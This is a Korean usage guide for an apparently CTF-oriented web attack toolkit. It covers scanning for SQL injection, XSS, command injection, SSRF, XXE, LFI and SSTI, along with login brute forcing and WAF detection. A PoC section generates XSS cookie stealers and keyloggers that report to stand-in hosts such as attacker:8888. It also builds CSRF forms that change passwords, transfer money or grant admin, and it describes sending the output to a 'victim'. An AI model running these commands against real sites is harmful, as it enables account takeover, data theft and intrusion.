# CTF-Toolkit 사용법 요약

## 기본 명령어

```bash
# 도움말
ctf-toolkit --help

# 버전 확인
ctf-toolkit --version
```

---

## 취약점 스캔

### SQL Injection
```bash
# 기본 스캔
ctf-toolkit sqli scan --url "http://target/page?id=1" --param id

# POST 방식
ctf-toolkit sqli scan --url "http://target/login" --param user --method POST --data "user=admin&pass=test"

# DB 타입 지정
ctf-toolkit sqli scan --url "http://target/page?id=1" --param id --db-type mysql

# 커스텀 페이로드
ctf-toolkit sqli scan --url "http://target/page?id=1" --param id --payloads ./payloads.txt

# Time-based 임계값 조정
ctf-toolkit sqli scan --url "http://target/page?id=1" --param id --time-threshold 5.0
```

### XSS (Cross-Site Scripting)
```bash
# 기본 스캔
ctf-toolkit xss scan --url "http://target/search?q=test" --param q

# POST 방식
ctf-toolkit xss scan --url "http://target/comment" --param content --method POST

# DOM XSS 포함
ctf-toolkit xss scan --url "http://target/page?q=test" --param q --include-dom
```

### Command Injection
```bash
# 기본 스캔
ctf-toolkit cmdi scan --url "http://target/ping?host=127.0.0.1" --param host

# 커스텀 페이로드
ctf-toolkit cmdi scan --url "http://target/ping?host=test" --param host --payloads ./cmdi.txt
```

### SSRF (Server-Side Request Forgery)
```bash
# 기본 스캔
ctf-toolkit ssrf scan --url "http://target/fetch?url=http://example.com" --param url

# 클라우드 메타데이터 스캔
ctf-toolkit ssrf scan --url "http://target/fetch?url=test" --param url --scan-cloud --cloud aws
```

### XXE (XML External Entity)
```bash
# 기본 스캔
ctf-toolkit xxe scan --url "http://target/api/xml" --method POST

# Blind XXE (콜백 URL)
ctf-toolkit xxe scan --url "http://target/api/xml" --callback-url http://attacker.com/xxe
```

### LFI (Local File Inclusion)
```bash
# 기본 스캔
ctf-toolkit lfi scan --url "http://target/page?file=home" --param file

# Windows 타겟
ctf-toolkit lfi scan --url "http://target/page?file=home" --param file --os-type windows

# PHP 래퍼 제외
ctf-toolkit lfi scan --url "http://target/page?file=home" --param file --no-php-wrappers
```

### SSTI (Server-Side Template Injection)
```bash
# 기본 스캔
ctf-toolkit ssti scan --url "http://target/page?name=test" --param name

# 엔진 지정
ctf-toolkit ssti scan --url "http://target/page?name=test" --param name --engine jinja2

# 탐지만 (익스플로잇 없이)
ctf-toolkit ssti scan --url "http://target/page?name=test" --param name --detect-only
```

---

## 브루트포스

### 디렉토리/파일 열거
```bash
# 기본 스캔
ctf-toolkit bruteforce dir --url "http://target/"
ctf-toolkit bf dir -u "http://target/"

# 커스텀 워드리스트
ctf-toolkit bf dir -u "http://target/" -w /usr/share/wordlists/dirb/common.txt

# 확장자 지정
ctf-toolkit bf dir -u "http://target/" -x php,txt,bak,old

# 상태 코드 필터링
ctf-toolkit bf dir -u "http://target/" -fs 404,403

# 응답 길이 필터링 (커스텀 404)
ctf-toolkit bf dir -u "http://target/" -fl 1234
```

### 로그인 브루트포스
```bash
# 기본 스캔 (내장 유저/패스워드 목록)
ctf-toolkit bruteforce login --url "http://target/login"
ctf-toolkit bf login -u "http://target/login"

# 단일 유저 + 패스워드 리스트
ctf-toolkit bf login -u "http://target/login" --username admin -P passwords.txt

# 유저 + 패스워드 리스트
ctf-toolkit bf login -u "http://target/login" -U users.txt -P passwords.txt

# 폼 필드명 지정
ctf-toolkit bf login -u "http://target/login" --user-field email --pass-field passwd

# 성공/실패 문자열 지정
ctf-toolkit bf login -u "http://target/login" --success "Welcome" --failure "Invalid"
```

### 파라미터 퍼징
```bash
# 기본 스캔
ctf-toolkit bruteforce fuzz --url "http://target/page"
ctf-toolkit bf fuzz -u "http://target/page"

# 커스텀 워드리스트
ctf-toolkit bf fuzz -u "http://target/page" -w params.txt

# 테스트 값 지정
ctf-toolkit bf fuzz -u "http://target/page" -v "test123"
```

---

## 정찰 (Recon)

```bash
# 타겟 핑거프린팅 (서버, OS, DB 탐지)
ctf-toolkit recon fingerprint --url "http://target/"

# 응답 헤더 분석
ctf-toolkit recon headers --url "http://target/"
```

---

## 인코딩/디코딩

```bash
# 전체 인코딩 (URL, Base64, HTML, Hex)
ctf-toolkit encode all --input "admin' OR 1=1--"

# URL 인코딩
ctf-toolkit encode url --input "test<script>"
ctf-toolkit encode url --decode --input "%3Cscript%3E"

# Base64
ctf-toolkit encode base64 --input "admin:password"
ctf-toolkit encode base64 --decode --input "YWRtaW46cGFzc3dvcmQ="

# HTML 엔티티
ctf-toolkit encode html --input "<script>alert(1)</script>"

# Hex
ctf-toolkit encode hex --input "hello"
```

---

## 치트시트

```bash
# 전체 목록
ctf-toolkit cheat --list

# 공격별 치트시트
ctf-toolkit cheat sqli              # SQL Injection
ctf-toolkit cheat sqli --filter mysql   # MySQL 전용
ctf-toolkit cheat sqli --filter union   # Union 기반
ctf-toolkit cheat xss               # XSS
ctf-toolkit cheat cmdi              # Command Injection
ctf-toolkit cheat ssrf              # SSRF
ctf-toolkit cheat xxe               # XXE
ctf-toolkit cheat lfi               # LFI
ctf-toolkit cheat ssti              # SSTI
```

---

## 학습 가이드

```bash
# 전체 가이드 목록
ctf-toolkit learn overview

# 공격별 가이드
ctf-toolkit learn guide sqli
ctf-toolkit learn guide xss
ctf-toolkit learn guide bruteforce

# 특정 기술만 보기
ctf-toolkit learn guide sqli --technique union_based
ctf-toolkit learn guide sqli --difficulty beginner

# 체크리스트
ctf-toolkit learn checklist sqli
ctf-toolkit learn checklist sqli --interactive   # 인터랙티브 모드

# 탐지 패턴
ctf-toolkit learn detect sqli
ctf-toolkit learn detect sqli --db-type mysql --show-examples

# 퀵 레퍼런스 카드
ctf-toolkit learn quick sqli
ctf-toolkit learn quick lfi

# 단축 명령어
ctf-toolkit guide sqli           # learn guide 단축
ctf-toolkit checklist xss        # learn checklist 단축
ctf-toolkit quick ssti           # learn quick 단축
```

---

## 플래그 추출

```bash
# 텍스트에서 추출
ctf-toolkit flag --text "Response: CTF{fl4g_h3r3}"

# 파일에서 추출
ctf-toolkit flag --file response.html

# 하이라이트 출력
ctf-toolkit flag --file response.html --highlight

# 커스텀 패턴
ctf-toolkit flag --text "Secret: FLAG-12345" --pattern "FLAG-\w+"
```

---

## 전역 옵션

모든 명령어에 적용 가능한 옵션입니다.

| 옵션 | 단축 | 설명 | 기본값 |
|------|------|------|--------|
| `--proxy` | `-p` | 프록시 URL (Burp Suite 연동) | - |
| `--cookie` | `-c` | 쿠키 문자열 | - |
| `--header` | `-H` | 커스텀 헤더 (복수 가능) | - |
| `--timeout` | `-t` | 요청 타임아웃 (초) | 10 |
| `--rate-limit` | `-r` | 초당 요청 수 | 10.0 |
| `--threads` | - | 동시 스레드 수 | 5 |
| `--output` | `-o` | 결과 저장 파일 경로 | - |
| `--output-format` | `-f` | 출력 형식 (json/txt) | json |
| `--verbose` | `-v` | 상세 출력 모드 | False |

### 사용 예시

```bash
# 프록시와 함께 사용 (Burp Suite 연동)
ctf-toolkit --proxy http://127.0.0.1:8080 sqli scan -u "http://target/?id=1" --param id

# 쿠키 설정
ctf-toolkit --cookie "session=abc123; token=xyz" sqli scan -u "http://target/?id=1" --param id

# 커스텀 헤더 (복수)
ctf-toolkit -H "Authorization: Bearer token123" -H "X-Custom: value" sqli scan -u "http://target/?id=1" --param id

# 결과 저장
ctf-toolkit --output result.json sqli scan -u "http://target/?id=1" --param id

# 상세 출력 + 느린 스캔
ctf-toolkit --verbose --rate-limit 2 --threads 2 sqli scan -u "http://target/?id=1" --param id
```

---

## 빠른 참조

### 공격별 명령어 요약

| 공격 | 명령어 |
|------|--------|
| SQLi | `ctf-toolkit sqli scan -u URL --param PARAM` |
| XSS | `ctf-toolkit xss scan -u URL --param PARAM` |
| CMDi | `ctf-toolkit cmdi scan -u URL --param PARAM` |
| SSRF | `ctf-toolkit ssrf scan -u URL --param PARAM` |
| XXE | `ctf-toolkit xxe scan -u URL` |
| LFI | `ctf-toolkit lfi scan -u URL --param PARAM` |
| SSTI | `ctf-toolkit ssti scan -u URL --param PARAM` |
| 디렉토리 | `ctf-toolkit bf dir -u URL` |
| 로그인 | `ctf-toolkit bf login -u URL` |
| 파라미터 | `ctf-toolkit bf fuzz -u URL` |

### 자주 쓰는 조합

```bash
# CTF 기본 정찰
ctf-toolkit recon fingerprint -u "http://target/"
ctf-toolkit bf dir -u "http://target/" -x php,txt,bak

# 로그인 페이지 발견 후
ctf-toolkit bf login -u "http://target/login" --username admin

# SQLi 발견 시
ctf-toolkit sqli scan -u "http://target/?id=1" --param id --db-type mysql
ctf-toolkit cheat sqli --filter mysql

# 파일 포함 발견 시
ctf-toolkit lfi scan -u "http://target/?page=home" --param page
ctf-toolkit quick lfi

# 플래그 찾기
ctf-toolkit flag --file response.html --highlight
```

---

## 학습 가이드 공격 유형

| 타입 | 설명 | 명령어 |
|------|------|--------|
| `sqli` | SQL Injection | `ctf-toolkit guide sqli` |
| `xss` | Cross-Site Scripting | `ctf-toolkit guide xss` |
| `cmdi` | OS Command Injection | `ctf-toolkit guide cmdi` |
| `ssrf` | Server-Side Request Forgery | `ctf-toolkit guide ssrf` |
| `xxe` | XML External Entity | `ctf-toolkit guide xxe` |
| `lfi` | Local File Inclusion | `ctf-toolkit guide lfi` |
| `ssti` | Server-Side Template Injection | `ctf-toolkit guide ssti` |
| `bruteforce` | Brute Force Attack | `ctf-toolkit guide bruteforce` |

---

## PoC (Proof of Concept) 생성

취약점 발견 후 증명용 PoC 파일을 자동 생성합니다. HTML, cURL, Python 스크립트가 한 파일에 포함됩니다.

### XSS PoC
```bash
# 기본 alert PoC
ctf-toolkit poc xss -u "http://target/?name=test" -p name

# 쿠키 탈취 PoC (콜백 서버 필요)
ctf-toolkit poc xss -u "http://target/?name=test" -p name -t cookie_stealer -c "http://attacker:8888/"

# 키로거
ctf-toolkit poc xss -u "http://target/?name=test" -p name -t keylogger -c "http://attacker:8888/"

# 피싱 폼 삽입
ctf-toolkit poc xss -u "http://target/?name=test" -p name -t phishing

# 리다이렉트
ctf-toolkit poc xss -u "http://target/?name=test" -p name -t redirect -c "http://attacker.com/"

# 페이지 변조
ctf-toolkit poc xss -u "http://target/?name=test" -p name -t defacement

# 인코딩 적용
ctf-toolkit poc xss -u "http://target/?name=test" -p name -e url
ctf-toolkit poc xss -u "http://target/?name=test" -p name -e double_url
ctf-toolkit poc xss -u "http://target/?name=test" -p name -e base64
```

### CSRF PoC
```bash
# POST 폼 CSRF
ctf-toolkit poc csrf -u "http://target/change-email" -d "email=attacker@evil.com"

# 비밀번호 변경 CSRF
ctf-toolkit poc csrf -u "http://target/change-password" -d "new_password=hacked123" --description "비밀번호 변경"

# GET 방식 CSRF
ctf-toolkit poc csrf -u "http://target/delete-account" -m GET --description "계정 삭제"

# JSON API CSRF
ctf-toolkit poc csrf -u "http://target/api/update" -j '{"role":"admin"}'

# 버튼 텍스트 커스텀
ctf-toolkit poc csrf -u "http://target/transfer" -d "to=attacker&amount=1000" --button-text "무료 상품 받기"
```

### SQLi PoC
```bash
# UNION 기반 (기본)
ctf-toolkit poc sqli -u "http://target/?id=1" -p id

# 인증 우회
ctf-toolkit poc sqli -u "http://target/login" -p username -t auth_bypass

# Error 기반
ctf-toolkit poc sqli -u "http://target/?id=1" -p id -t error -D mysql

# Time 기반 Blind
ctf-toolkit poc sqli -u "http://target/?id=1" -p id -t time -D mysql

# Boolean 기반 Blind
ctf-toolkit poc sqli -u "http://target/?id=1" -p id -t boolean

# 커스텀 페이로드
ctf-toolkit poc sqli -u "http://target/?id=1" -p id --payload "' UNION SELECT 1,2,3--"

# 컬럼 수 지정
ctf-toolkit poc sqli -u "http://target/?id=1" -p id --columns 5

# DB 타입 지정
ctf-toolkit poc sqli -u "http://target/?id=1" -p id -D postgresql
ctf-toolkit poc sqli -u "http://target/?id=1" -p id -D mssql
ctf-toolkit poc sqli -u "http://target/?id=1" -p id -D oracle
```

### PoC 출력 옵션
```bash
# 출력 디렉토리 지정
ctf-toolkit poc xss -u "http://target/?name=test" -p name -o ./poc_files/

# HTML 파일 생성 안 함 (터미널 출력만)
ctf-toolkit poc xss -u "http://target/?name=test" -p name --no-html
```

### 생성되는 파일 구조

타겟별로 폴더가 자동 생성됩니다:

```
./
├── target.com/
│   ├── xss_poc_alert.html
│   ├── xss_poc_cookie_stealer.html
│   ├── csrf_poc.html
│   └── sqli_poc_union.html
│
├── ctf.example.org_port8080/
│   ├── xss_poc_alert.html
│   └── sqli_poc_time.html
│
└── vulnerable-site.com/
    ├── xss_poc_alert.html
    ├── xss_poc_alert_1.html    # 중복 시 자동 번호 추가
    └── xss_poc_alert_2.html
```

### PoC 파일 내용

생성된 HTML 파일에는 다음이 포함됩니다:

| 항목 | 설명 |
|------|------|
| 타겟 정보 | URL, 파라미터, 취약점 유형 |
| 페이로드 | 복사 버튼 포함 |
| 익스플로잇 URL | 클릭 가능한 링크 |
| cURL 명령어 | 복사 버튼 포함 |
| Python 스크립트 | 자동화 익스플로잇 코드 |
| 테스트 버튼 | 브라우저에서 바로 실행 |
| 재현 단계 | 1, 2, 3... 순서 |
| 증거 설명 | CTF 보고서용 |

### 스캔 → PoC 생성 워크플로우

```bash
# 1. 취약점 스캔
ctf-toolkit xss scan -u "http://target/?name=test" --param name

# 2. 취약점 발견 시 PoC 생성
ctf-toolkit poc xss -u "http://target/?name=test" -p name -t cookie_stealer -c "http://your-ip:8888/"

# 3. 콜백 서버 실행
python3 -m http.server 8888

# 4. 생성된 PoC HTML을 피해자에게 전송 (CTF 시나리오)
```

---

## 스마트 스캔

자동으로 여러 취약점을 탐지하는 지능형 스캔입니다.

```bash
# 기본 스마트 스캔 (모든 취약점 유형)
ctf-toolkit smart -u "http://target/?id=1" -p id

# 특정 취약점만 스캔
ctf-toolkit smart -u "http://target/?id=1" -p id -T sqli -T xss

# 공격적 모드 (더 많은 페이로드)
ctf-toolkit smart -u "http://target/?id=1" -p id --aggressive

# WAF 탐지 건너뛰기
ctf-toolkit smart -u "http://target/?id=1" -p id --skip-waf
```

---

## WAF 탐지

```bash
# WAF 탐지
ctf-toolkit recon waf -u "http://target/"

# 프로브 없이 헤더만으로 탐지
ctf-toolkit recon waf -u "http://target/" --no-probe
```

